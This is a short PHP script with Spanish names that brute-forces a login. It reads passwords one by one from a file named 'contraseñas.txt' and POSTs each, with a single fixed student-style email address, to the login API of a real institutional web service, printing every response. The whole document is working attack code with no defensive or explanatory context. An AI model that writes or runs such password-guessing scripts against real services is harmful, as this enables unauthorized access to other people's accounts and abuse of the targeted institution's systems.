<?php
$archivo = 'contraseñas.txt';
$url_endpoint = 'http://topicosweb.celaya.tecnm.mx/TopWeb/public/api/v1/login';
$lineas = file($archivo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
function enviarDatosRecursivo($lineas, $index, $url) {
    if ($index >= count($lineas)) {
        echo "Proceso finalizado.";
        return;
    }
    $email = "l20030974@celaya.tecnm.mx";
    $password = $lineas[$index];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['email' => $email, 'password' => $password]);

    $response = curl_exec($ch);
    curl_close($ch);

    echo "Respuesta: $response <br>";

    enviarDatosRecursivo($lineas, $index + 1, $url);
}

enviarDatosRecursivo($lineas, 0, $url_endpoint);
?>
